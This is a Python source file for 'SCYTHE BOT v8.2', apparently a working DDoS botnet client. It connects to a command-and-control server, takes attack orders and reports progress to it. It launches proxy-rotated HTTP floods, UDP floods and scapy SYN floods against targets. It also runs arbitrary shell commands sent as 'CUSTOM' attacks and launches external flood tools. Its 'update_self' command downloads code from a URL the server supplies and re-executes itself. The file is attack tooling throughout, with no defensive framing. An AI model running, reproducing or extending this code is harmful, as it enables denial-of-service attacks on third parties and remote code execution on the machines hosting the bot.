#!/usr/bin/env python3
"""
SCYTHE BOT v8.2 — MAXIMIZED, FIXED & SYNCED WITH C2
Features:
- Auto-create directories before logging setup
- Hybrid Rate Limiter (works with ANY RPS)
- Dynamic RPS Update (mid-attack via C2 command)
- Log Rotation (auto cleanup, max 10MB x 5 files)
- Bandwidth & System Stats Reporting
- Graceful Shutdown (SIGTERM/SIGINT)
- Auto Thread Adjust (ulimit too low)
- Smart Reconnection (exponential backoff + jitter)
- PROXY-FIRST: All L7 attacks MUST use proxy
- Smart Proxy Rotation: auto-skip dead proxies
- SOCKS5/HTTP/SOCKS4 support
- MID-ATTACK PROXY REFRESH
- PROXY POOL REFRESH every 3 minutes
- FIXED: Better command parsing from C2
- FIXED: Support both {"cmd": "attack"} and {"type": "command", "cmd": "attack"}
- FIXED: Stop specific attack by attack_id
- FIXED: Better error handling and logging
"""

import socket
import subprocess
import time
import sys
import json
import threading
import os
import random
import configparser
import signal
import logging
from datetime import datetime
from logging.handlers import RotatingFileHandler

# ========== FIX #1: Auto-create directories BEFORE logging setup ==========
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
os.makedirs(os.path.join(SCRIPT_DIR, 'logs'), exist_ok=True)
os.makedirs(os.path.join(SCRIPT_DIR, 'data'), exist_ok=True)

# ========== FIX #2: Graceful import for optional deps ==========
try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False
    print("[WARN] psutil not installed. System stats will be limited.")

try:
    import requests
    from requests.adapters import HTTPAdapter
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False
    print("[ERROR] requests not installed! Run: pip install requests[socks] psutil")
    sys.exit(1)

try:
    from urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
except:
    pass

# ========== LOGGING SETUP (Rotation) ==========
LOG_FILE = os.path.join(SCRIPT_DIR, 'logs', 'bot.log')
logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] [%(levelname)s] %(message)s',
    handlers=[
        RotatingFileHandler(LOG_FILE, maxBytes=10*1024*1024, backupCount=5, encoding='utf-8'),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger('scythe_bot')

# ========== GRACEFUL SHUTDOWN ==========
_shutdown_event = threading.Event()

def signal_handler(signum, frame):
    logger.info(f"🛑 Received signal {signum}, shutting down gracefully...")
    _shutdown_event.set()

signal.signal(signal.SIGTERM, signal_handler)
signal.signal(signal.SIGINT, signal_handler)

# ========== ULIMIT CHECK & AUTO ADJUST ==========
def check_and_adjust_limits(desired_threads):
    try:
        import resource
        soft_nofile, hard_nofile = resource.getrlimit(resource.RLIMIT_NOFILE)
        soft_nproc, hard_nproc = resource.getrlimit(resource.RLIMIT_NPROC)

        min_fd_needed = desired_threads * 4 + 100
        min_proc_needed = desired_threads + 200

        adjusted_threads = desired_threads

        if soft_nofile < min_fd_needed:
            logger.warning(f"⚠️ ulimit -n ({soft_nofile}) too low for {desired_threads} threads. Need {min_fd_needed}. Auto-reducing threads.")
            adjusted_threads = max(10, (soft_nofile - 100) // 4)
        else:
            logger.info(f"✅ ulimit -n: {soft_nofile} (OK for {desired_threads} threads)")

        if soft_nproc < min_proc_needed:
            logger.warning(f"⚠️ ulimit -u ({soft_nproc}) too low. Need {min_proc_needed}.")
            adjusted_threads = min(adjusted_threads, max(10, soft_nproc - 200))
        else:
            logger.info(f"✅ ulimit -u: {soft_nproc} (OK)")

        if adjusted_threads != desired_threads:
            logger.warning(f"🔧 Auto-adjusted threads: {desired_threads} → {adjusted_threads}")

        return adjusted_threads
    except ImportError:
        logger.warning("⚠️ resource module not available. Skipping ulimit check.")
        return desired_threads

# ========== BACA KONFIGURASI ==========
config = configparser.ConfigParser()
config.read(os.path.join(SCRIPT_DIR, "config.ini"))

C2_IP = config.get("C2", "IP", fallback="127.0.0.1")
C2_PORT = config.getint("C2", "PORT", fallback=4884)
BOT_ID = config.get("C2", "ID", fallback=socket.gethostname())
RAW_THREADS = config.getint("C2", "THREADS", fallback=60)
RPS_LIMIT = config.getint("C2", "RPS_LIMIT", fallback=800)
BANDWIDTH_LIMIT_MB = config.getint("C2", "BANDWIDTH_LIMIT_MB", fallback=0)

BOT_ID = BOT_ID.strip()
if not BOT_ID or BOT_ID.lower() == "auto":
    BOT_ID = socket.gethostname()

if len(sys.argv) > 1:
    C2_IP = sys.argv[1]
if len(sys.argv) > 2:
    C2_PORT = int(sys.argv[2])
if len(sys.argv) > 3:
    BOT_ID = sys.argv[3].strip()
    if not BOT_ID or BOT_ID.lower() == "auto":
        BOT_ID = socket.gethostname()

THREADS = check_and_adjust_limits(RAW_THREADS)

# ========== VARIABEL GLOBAL ==========
proxy_list = []
current_attacks = {}
stop_event = threading.Event()
heartbeat_interval = 5
reconnect_delay = 5
max_reconnect_delay = 60
read_buffer = ""

# ========== PROXY MANAGEMENT ==========
class ProxyPool:
    """Smart proxy pool with rotation, health tracking, dead-proxy skipping."""
    def __init__(self, proxies):
        self._all_proxies = list(proxies) if proxies else []
        self._alive = list(self._all_proxies)
        self._dead = set()
        self._fail_counts = {}
        self._lock = threading.Lock()
        self._index = 0
        self._refresh_count = 0

    @property
    def count(self):
        with self._lock:
            return len(self._alive)

    @property
    def total(self):
        with self._lock:
            return len(self._all_proxies)

    def refresh(self, new_proxies):
        """Refresh proxy pool dengan proxy baru dari C2 (mid-attack)."""
        with self._lock:
            old_count = len(self._alive)
            for p in new_proxies:
                if p not in self._all_proxies and p not in self._dead:
                    self._all_proxies.append(p)
                    self._alive.append(p)
            self._refresh_count += 1
            new_count = len(self._alive)
            logger.info(f"[PROXY] Pool refreshed: {old_count} → {new_count} alive (refresh #{self._refresh_count})")

    def get_next(self):
        """Round-robin with auto-skip dead proxies."""
        with self._lock:
            if not self._alive:
                return None
            proxy = self._alive[self._index % len(self._alive)]
            self._index += 1
            return proxy

    def mark_dead(self, proxy_url, max_failures=5):
        """Mark a proxy as dead after N failures."""
        with self._lock:
            if proxy_url not in self._fail_counts:
                self._fail_counts[proxy_url] = 0
            self._fail_counts[proxy_url] += 1

            if self._fail_counts[proxy_url] >= max_failures:
                if proxy_url in self._alive:
                    self._alive.remove(proxy_url)
                    self._dead.add(proxy_url)
                    logger.warning(f"[PROXY] {proxy_url} marked DEAD (failures: {self._fail_counts[proxy_url]})")

    def mark_alive(self, proxy_url):
        """Reset failure count on success."""
        with self._lock:
            self._fail_counts[proxy_url] = 0

def format_proxy(proxy_url):
    """Format proxy URL untuk requests library."""
    if not proxy_url:
        return None

    proxy_url = proxy_url.strip()

    if proxy_url.startswith(('http://', 'https://', 'socks4://', 'socks5://')):
        return {'http': proxy_url, 'https': proxy_url}

    formatted = f'http://{proxy_url}'
    return {'http': formatted, 'https': formatted}

def log(msg, level=logging.INFO):
    logger.log(level, f"[{BOT_ID}] {msg}")

def connect_to_c2():
    global reconnect_delay
    while not _shutdown_event.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            try:
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, 10)
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPINTVL, 5)
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPCNT, 3)
            except:
                pass
            s.connect((C2_IP, C2_PORT))
            log("Connected to C2!")
            s.sendall(json.dumps({"type": "register", "id": BOT_ID, "threads": THREADS, "rps_limit": RPS_LIMIT}).encode('utf-8') + b"\n")
            s.sendall(json.dumps({"type": "heartbeat", "id": BOT_ID, "time": int(time.time())}).encode('utf-8') + b"\n")
            log("Initial register + heartbeat sent")
            reconnect_delay = 5
            return s
        except Exception as e:
            log(f"Connection failed: {e}. Retry in {reconnect_delay}s...", logging.WARNING)
            time.sleep(reconnect_delay + random.uniform(0, 2))
            if reconnect_delay < max_reconnect_delay:
                reconnect_delay = min(reconnect_delay * 1.5, max_reconnect_delay)
    return None

def send_report(sock, report):
    try:
        data = json.dumps(report).encode('utf-8') + b"\n"
        sock.sendall(data)
        return True
    except Exception as e:
        log(f"Send report error: {e}", logging.WARNING)
        return False

# ========== HYBRID RATE LIMITER ==========
class HybridRateLimiter:
    def __init__(self, rate_per_second):
        self.rate = float(rate_per_second)
        self.tokens = 0.0
        self.last_update = time.time()
        self.lock = threading.Lock()
        self.interval = 1.0 / self.rate if self.rate > 0 else 0

    def acquire(self):
        if self.rate <= 0:
            return True

        with self.lock:
            now = time.time()
            elapsed = now - self.last_update
            self.tokens = min(self.rate, self.tokens + elapsed * self.rate)
            self.last_update = now

            if self.tokens >= 1.0:
                self.tokens -= 1.0
                return True

            sleep_time = (1.0 - self.tokens) / self.rate
            return sleep_time

# ========== ATTACK ENGINE v8.2 (MAXIMIZED & FIXED) ==========
class AttackEngine(threading.Thread):
    def __init__(self, attack_id, method, target, port, duration, hold_time, extra, rps_limit, proxies, sock):
        super().__init__(daemon=True)
        self.attack_id = attack_id
        self.method = method.upper()
        self.target = target
        self.port = port
        self.duration = duration
        self.hold_time = hold_time
        self.extra = extra
        self.rps_limit = rps_limit
        self.proxies = proxies if proxies else []
        self.sock = sock
        self.stop_flag = threading.Event()
        self.rps_update_event = threading.Event()
        self._lock = threading.Lock()
        self._total_requests = 0
        self._success_requests = 0
        self._proxy_requests = 0
        self._direct_requests = 0
        self._proxy_refresh_count = 0
        self.start_time = None
        self.thread_count = 0
        self._last_reported_total = 0
        self._net_io_start = None
        self.proxy_pool = None

    @property
    def total_requests(self):
        with self._lock:
            return self._total_requests

    @property
    def success_requests(self):
        with self._lock:
            return self._success_requests

    @property
    def proxy_requests(self):
        with self._lock:
            return self._proxy_requests

    @property
    def direct_requests(self):
        with self._lock:
            return self._direct_requests

    def _inc_total(self):
        with self._lock:
            self._total_requests += 1

    def _inc_success(self):
        with self._lock:
            self._success_requests += 1

    def _inc_proxy(self):
        with self._lock:
            self._proxy_requests += 1

    def _inc_direct(self):
        with self._lock:
            self._direct_requests += 1

    def update_rps(self, new_rps_limit):
        self.rps_limit = new_rps_limit
        self.rps_update_event.set()
        log(f"[ENGINE] RPS updated to {new_rps_limit} for attack {self.attack_id}")

    def update_proxies(self, new_proxies):
        """Update proxy pool mid-attack (dari C2)."""
        if self.proxy_pool and new_proxies:
            self.proxy_pool.refresh(new_proxies)
            self._proxy_refresh_count += 1
            log(f"[ENGINE] Proxy pool refreshed mid-attack (#{self._proxy_refresh_count})")

    def run(self):
        self.start_time = time.time()
        if PSUTIL_AVAILABLE:
            self._net_io_start = psutil.net_io_counters()
        end_time = self.start_time + self.duration + self.hold_time

        self.proxy_pool = ProxyPool(self.proxies)

        log(f"[ENGINE] Attack {self.attack_id} started | Method: {self.method} | Target: {self.target} | Threads: {THREADS} | RPS/Bot: {self.rps_limit} | Proxies: {self.proxy_pool.total} | Duration: {self.duration}s | 12H STABLE MODE")

        progress_thread = threading.Thread(target=self._progress_reporter, daemon=True)
        progress_thread.start()

        try:
            if self.method in ["SPECTRE", "VORTEX", "TITAN", "PHANTOM", "SERPENT", "STORM"]:
                self._run_layer7(end_time)
            elif self.method in ["OBLIVION", "CHAOS", "ANNIHILATOR", "GHOST", "UDP"]:
                self._run_layer4(end_time)
            elif self.method == "SYN":
                self._run_syn(end_time)
            elif self.method == "SCYTHE":
                self._run_external(f"python3 /root/SCYTHE/attack.py {self.extra} {self.target} {self.port} {self.duration + self.hold_time}")
            elif self.method == "MHDDOS":
                self._run_external(f"python3 /root/MHDDOS/start.py {self.extra} {self.target} {self.port} {self.duration + self.hold_time}")
            elif self.method == "CUSTOM":
                self._run_external(self.extra)
            else:
                log(f"[ENGINE] Unknown method: {self.method}")
        except Exception as e:
            log(f"[ENGINE] CRITICAL ERROR: {e}", logging.ERROR)
            import traceback
            log(f"[ENGINE] Traceback: {traceback.format_exc()}", logging.ERROR)

        self.stop_flag.set()
        progress_thread.join(timeout=2)
        elapsed = max(1, time.time() - self.start_time) if self.start_time else 1
        final_rps = self.total_requests // elapsed

        log(f"[ENGINE] Attack {self.attack_id} finished | Total: {self.total_requests} | Success: {self.success_requests} | Proxy: {self.proxy_requests} | Direct: {self.direct_requests} | Refreshes: {self._proxy_refresh_count} | Avg RPS: {final_rps}")

    def _progress_reporter(self):
        while not self.stop_flag.is_set():
            time.sleep(5)
            if self.stop_flag.is_set():
                break

            current_total = self.total_requests
            delta = current_total - self._last_reported_total
            self._last_reported_total = current_total

            elapsed = max(1, time.time() - self.start_time) if self.start_time else 1
            current_rps = delta // 5 if delta > 0 else 0

            bw_sent_mb = 0
            bw_recv_mb = 0
            cpu_percent = 0
            mem_percent = 0

            if PSUTIL_AVAILABLE and self._net_io_start:
                net_now = psutil.net_io_counters()
                bw_sent_mb = (net_now.bytes_sent - self._net_io_start.bytes_sent) / 1024 / 1024
                bw_recv_mb = (net_now.bytes_recv - self._net_io_start.bytes_recv) / 1024 / 1024
                cpu_percent = psutil.cpu_percent(interval=0.1)
                mem = psutil.virtual_memory()
                mem_percent = mem.percent

            report = {
                "type": "attack_progress",
                "id": BOT_ID,
                "attack_id": self.attack_id,
                "delta_requests": delta,
                "total_requests": current_total,
                "current_rps": current_rps,
                "success_requests": self.success_requests,
                "proxy_requests": self.proxy_requests,
                "direct_requests": self.direct_requests,
                "proxy_refresh_count": self._proxy_refresh_count,
                "proxy_pool_alive": self.proxy_pool.count if self.proxy_pool else 0,
                "bandwidth_sent_mb": round(bw_sent_mb, 2),
                "bandwidth_recv_mb": round(bw_recv_mb, 2),
                "cpu_percent": cpu_percent,
                "mem_percent": mem_percent,
            }
            send_report(self.sock, report)
            log(f"[PROGRESS] Delta: +{delta} | Total: {current_total} | RPS: {current_rps} | Success: {self.success_requests} | Proxy: {self.proxy_requests} | Pool: {self.proxy_pool.count if self.proxy_pool else 0} | Refreshes: {self._proxy_refresh_count} | BW: {bw_sent_mb:.1f}MB/{bw_recv_mb:.1f}MB | CPU: {cpu_percent}%")

    def _run_layer7(self, end_time):
        self.thread_count = THREADS

        if self.proxy_pool.count == 0:
            log(f"[ENGINE] ⚠️ NO PROXIES AVAILABLE! Waiting for proxies...")
            if self.proxy_pool.total == 0:
                log(f"[ENGINE] ❌ No proxies at all. Attack aborted.")
                return

        rps_per_thread = self.rps_limit / self.thread_count if self.rps_limit > 0 else 0
        log(f"[ENGINE] Starting {self.thread_count} L7 workers | Rate: {rps_per_thread:.3f} RPS/thread | Total target: {self.rps_limit} RPS | PROXY-FIRST | 12H STABLE")

        threads = []
        for i in range(self.thread_count):
            limiter = HybridRateLimiter(rps_per_thread)
            t = threading.Thread(target=self._l7_worker, args=(end_time, i, limiter), daemon=True)
            t.start()
            threads.append(t)

        for t in threads:
            t.join(timeout=max(0, end_time - time.time()))

    def _l7_worker(self, end_time, worker_id, limiter):
        session = requests.Session()
        adapter = HTTPAdapter(pool_connections=1, pool_maxsize=5, max_retries=0)
        session.mount('http://', adapter)
        session.mount('https://', adapter)

        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 14.5; rv:127.0) Gecko/20100101 Firefox/127.0',
            'Mozilla/5.0 (X11; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/125.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15',
        ]

        session.headers.update({
            'User-Agent': random.choice(user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'DNT': '1',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
        })

        req_count = 0
        err_count = 0
        proxy_failures = 0
        consecutive_proxy_fails = 0
        current_proxy = None
        current_proxy_formatted = None

        has_proxies = self.proxy_pool.count > 0 or self.proxy_pool.total > 0

        if not has_proxies:
            log(f"[W{worker_id}] ❌ No proxies available. Worker idle.")
            return

        while time.time() < end_time and not self.stop_flag.is_set() and not _shutdown_event.is_set():
            if self.rps_update_event.is_set():
                self.rps_update_event.clear()
                new_rps_per_thread = self.rps_limit / self.thread_count if self.rps_limit > 0 else 0
                limiter.rate = float(new_rps_per_thread)
                limiter.interval = 1.0 / limiter.rate if limiter.rate > 0 else 0
                log(f"[W{worker_id}] RPS limit updated to {self.rps_limit} ({new_rps_per_thread:.3f}/thread)")

            result = limiter.acquire()
            if result is not True:
                sleep_time = result
                if sleep_time > 0.001:
                    time.sleep(sleep_time)
                continue

            if current_proxy is None or consecutive_proxy_fails >= 3:
                current_proxy = self.proxy_pool.get_next()
                if current_proxy:
                    current_proxy_formatted = format_proxy(current_proxy)
                    consecutive_proxy_fails = 0
                    proxy_failures = 0
                else:
                    log(f"[W{worker_id}] ⚠️ All proxies dead. Retrying in 2s...")
                    time.sleep(2)
                    continue

            try:
                resp = session.get(
                    self.target,
                    timeout=(5, 8),
                    verify=False,
                    proxies=current_proxy_formatted,
                    allow_redirects=False,
                    stream=True,
                )
                resp.close()

                self._inc_total()
                self._inc_proxy()

                if resp.status_code < 400:
                    self._inc_success()
                    self.proxy_pool.mark_alive(current_proxy)
                    consecutive_proxy_fails = 0
                else:
                    consecutive_proxy_fails += 1

                req_count += 1

            except requests.exceptions.ProxyError as e:
                err_count += 1
                proxy_failures += 1
                consecutive_proxy_fails += 1
                self.proxy_pool.mark_dead(current_proxy, max_failures=5)
                current_proxy = None
                current_proxy_formatted = None

            except requests.exceptions.Timeout:
                self._inc_total()
                err_count += 1
                consecutive_proxy_fails += 1
                if consecutive_proxy_fails >= 5:
                    self.proxy_pool.mark_dead(current_proxy, max_failures=8)
                    current_proxy = None
                    current_proxy_formatted = None

            except requests.exceptions.ConnectionError as e:
                self._inc_total()
                err_count += 1
                consecutive_proxy_fails += 1
                self.proxy_pool.mark_dead(current_proxy, max_failures=5)
                current_proxy = None
                current_proxy_formatted = None

            except Exception as e:
                err_count += 1
                consecutive_proxy_fails += 1
                if err_count <= 3:
                    log(f"[W{worker_id}] Error: {e}")
                if consecutive_proxy_fails >= 3:
                    current_proxy = None
                    current_proxy_formatted = None

        log(f"[W{worker_id}] Finished | Requests: {req_count} | Errors: {err_count} | Proxy: {self.proxy_requests}")

    def _run_layer4(self, end_time):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            bytes_data = random._urandom(65500)
            while time.time() < end_time and not self.stop_flag.is_set() and not _shutdown_event.is_set():
                try:
                    sock.sendto(bytes_data, (self.target, self.port))
                    self._inc_total()
                    self._inc_success()
                except:
                    pass
        except Exception as e:
            log(f"[ENGINE] L4 error: {e}")

    def _run_syn(self, end_time):
        self._run_external(f'python3 -c "from scapy.all import *; send(IP(dst=\'{self.target}\')/TCP(dport={self.port}, flags=\'S\'), count=10000, inter=0.001, verbose=0)"')

    def _run_external(self, cmd):
        try:
            proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            stdout, stderr = proc.communicate(timeout=self.duration + self.hold_time + 5)
            log(f"[ENGINE] External cmd finished | rc={proc.returncode}")
        except subprocess.TimeoutExpired:
            proc.kill()
            log("[ENGINE] External cmd timed out")
        except Exception as e:
            log(f"[ENGINE] External cmd error: {e}")

    def stop(self):
        self.stop_flag.set()

# ========== PARSER PERINTAH DARI C2 (FIXED) ==========
def handle_command(sock, cmd_json):
    global proxy_list
    try:
        data = json.loads(cmd_json)
        
        # FIXED: Support both formats: {"cmd": "attack"} and {"type": "command", "cmd": "attack"}
        cmd = data.get("cmd", "").lower()
        msg_type = data.get("type", "").lower()
        
        # Debug: log semua command yang diterima
        log(f"📩 RAW COMMAND: type={msg_type}, cmd={cmd}, keys={list(data.keys())}")
        
        if not cmd and msg_type:
            # Kalau gak ada cmd tapi ada type, coba pakai type sebagai cmd
            cmd = msg_type

        if cmd == "ping":
            send_report(sock, {"type": "pong", "id": BOT_ID, "time": time.time()})

        elif cmd == "attack":
            attack_id = data.get("attack_id", str(time.time()))
            method = data.get("method")
            target = data.get("target")
            port = data.get("port", 80)
            duration = data.get("duration", 60)
            hold_time = data.get("hold_time", 0) or 0
            extra = data.get("extra", "")
            rps_limit = data.get("rps_limit", RPS_LIMIT)
            if rps_limit <= 0:
                rps_limit = RPS_LIMIT

            attack_proxies = data.get("proxies", [])
            if attack_proxies:
                proxy_list = attack_proxies
                log(f"[ATTACK] Received {len(attack_proxies)} proxies from C2")

            active_proxies = attack_proxies if attack_proxies else proxy_list

            if not active_proxies:
                log(f"⚠️ [ATTACK] No proxies available! Attack will proceed with available pool only.")
            else:
                log(f"✅ [ATTACK] Using {len(active_proxies)} proxies for attack")

            send_report(sock, {"type": "attack_started", "id": BOT_ID, "attack_id": attack_id, "proxies_count": len(active_proxies)})

            engine = AttackEngine(
                attack_id=attack_id,
                method=method,
                target=target,
                port=port,
                duration=duration,
                hold_time=hold_time,
                extra=extra,
                rps_limit=rps_limit,
                proxies=active_proxies,
                sock=sock
            )
            current_attacks[attack_id] = engine
            engine.start()

            def wait_and_report():
                try:
                    engine.join(timeout=duration + hold_time + 15)
                    if engine.is_alive():
                        engine.stop()
                        engine.join(timeout=5)

                    elapsed = max(1, time.time() - engine.start_time) if engine.start_time else 1
                    rps = engine.total_requests // elapsed

                    report = {
                        "type": "attack_result",
                        "id": BOT_ID,
                        "attack_id": attack_id,
                        "method": method,
                        "target": target,
                        "port": port,
                        "duration": duration,
                        "hold_time": hold_time,
                        "status": "success" if engine.success_requests > 0 else "completed",
                        "total_requests": engine.total_requests,
                        "success_requests": engine.success_requests,
                        "proxy_requests": engine.proxy_requests,
                        "direct_requests": engine.direct_requests,
                        "proxy_refresh_count": engine._proxy_refresh_count,
                        "rps": rps,
                        "output": f"Total: {engine.total_requests} | Success: {engine.success_requests} | Proxy: {engine.proxy_requests} | Direct: {engine.direct_requests} | Refreshes: {engine._proxy_refresh_count} | RPS: {rps}"
                    }
                    send_report(sock, report)
                    current_attacks.pop(attack_id, None)
                except Exception as e:
                    log(f"[ENGINE] wait_and_report error: {e}", logging.ERROR)
                    import traceback
                    log(f"[ENGINE] Traceback: {traceback.format_exc()}", logging.ERROR)

            threading.Thread(target=wait_and_report, daemon=True).start()

        elif cmd == "proxy_refresh":
            attack_id = data.get("attack_id")
            new_proxies = data.get("proxies", [])
            if attack_id in current_attacks and new_proxies:
                engine = current_attacks[attack_id]
                engine.update_proxies(new_proxies)
                send_report(sock, {"type": "proxy_refreshed", "id": BOT_ID, "attack_id": attack_id, "new_count": len(new_proxies)})
            else:
                log(f"⚠️ Cannot refresh proxies: attack {attack_id} not found or no proxies")

        elif cmd == "update_rps":
            attack_id = data.get("attack_id")
            new_rps = data.get("rps_limit", 0)
            if attack_id in current_attacks and new_rps > 0:
                engine = current_attacks[attack_id]
                engine.update_rps(new_rps)
                send_report(sock, {"type": "rps_updated", "id": BOT_ID, "attack_id": attack_id, "new_rps": new_rps})
            else:
                log(f"⚠️ Cannot update RPS: attack {attack_id} not found or invalid RPS {new_rps}")

        elif cmd == "stop":
            # FIXED: Support stop specific attack by attack_id
            attack_id = data.get("attack_id")
            if attack_id and attack_id in current_attacks:
                log(f"🛑 Stopping specific attack: {attack_id}")
                engine = current_attacks[attack_id]
                engine.stop()
                engine.join(timeout=5)
                current_attacks.pop(attack_id, None)
                send_report(sock, {"type": "attack_stopped", "id": BOT_ID, "attack_id": attack_id})
            else:
                # Stop all attacks (legacy behavior)
                log("🛑 Stop all attacks command received")
                stop_event.set()
                for aid, engine in list(current_attacks.items()):
                    try:
                        engine.stop()
                        engine.join(timeout=3)
                    except:
                        pass
                current_attacks.clear()
                stop_event.clear()
                send_report(sock, {"type": "all_stopped", "id": BOT_ID})

        elif cmd == "proxy_update":
            new_proxies = data.get("proxies", [])
            proxy_list = new_proxies
            log(f"Received {len(proxy_list)} proxies from C2")
            send_report(sock, {"type": "proxy_updated", "id": BOT_ID, "count": len(proxy_list)})

        elif cmd == "update_self":
            url = data.get("url")
            if url:
                try:
                    r = requests.get(url)
                    with open(__file__, "wb") as f:
                        f.write(r.content)
                    log("Self-updated, restarting...")
                    os.execv(sys.executable, [sys.executable] + sys.argv)
                except Exception as e:
                    send_report(sock, {"type": "update_failed", "error": str(e)})

        elif cmd == "exit":
            log("Exit command received. Goodbye!")
            sock.close()
            sys.exit(0)
        else:
            log(f"Unknown command: {cmd} | Data: {data}")

    except json.JSONDecodeError as e:
        log(f"Invalid JSON: {cmd_json[:200]} - {e}", logging.WARNING)
    except Exception as e:
        log(f"Error handling command: {e}", logging.ERROR)
        import traceback
        log(f"Traceback: {traceback.format_exc()}", logging.ERROR)

# ========== MAIN LOOP ==========
def main():
    global read_buffer
    log(f"🚀 Bot started. ID: {BOT_ID} | Threads: {THREADS} | RPS Limit: {RPS_LIMIT} | Bandwidth Limit: {BANDWIDTH_LIMIT_MB}MB | PROXY-FIRST | 12H STABLE | Connecting to C2...")
    while not _shutdown_event.is_set():
        sock = connect_to_c2()
        if not sock:
            break
        read_buffer = ""
        try:
            while not _shutdown_event.is_set():
                sock.settimeout(heartbeat_interval)
                try:
                    chunk = sock.recv(4096).decode('utf-8', errors='ignore')
                    if not chunk:
                        break
                    read_buffer += chunk
                    while "\n" in read_buffer:
                        line, read_buffer = read_buffer.split("\n", 1)
                        line = line.strip()
                        if line:
                            handle_command(sock, line)
                except socket.timeout:
                    send_report(sock, {"type": "heartbeat", "id": BOT_ID, "time": time.time()})
                    continue
                except Exception as e:
                    log(f"Recv error: {e}", logging.WARNING)
                    break
        except Exception as e:
            log(f"Connection lost: {e}", logging.WARNING)
            sock.close()
            if not _shutdown_event.is_set():
                time.sleep(5)

    log("🛑 Bot shutdown complete.")

if __name__ == "__main__":
    main()